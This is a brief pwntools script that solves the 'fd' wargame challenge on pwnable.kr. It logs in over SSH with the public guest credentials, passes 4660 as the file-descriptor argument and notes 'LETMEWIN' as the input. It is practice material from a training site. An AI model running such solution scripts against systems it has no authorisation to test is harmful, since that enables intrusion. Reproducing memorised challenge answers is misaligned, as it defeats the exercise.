from pwn import *

def main ():
	USER = "fd"
	HOST = "pwnable.kr"
	PORT = 2222
	PASS = "guest"
	s = ssh (USER, HOST, PORT, PASS)

	argv = str(4660)
	r = s.process(["/home/fd/fd", argv])
	r.interactive()
	# LETMEWIN

if __name__ == "__main__" :
	main ()
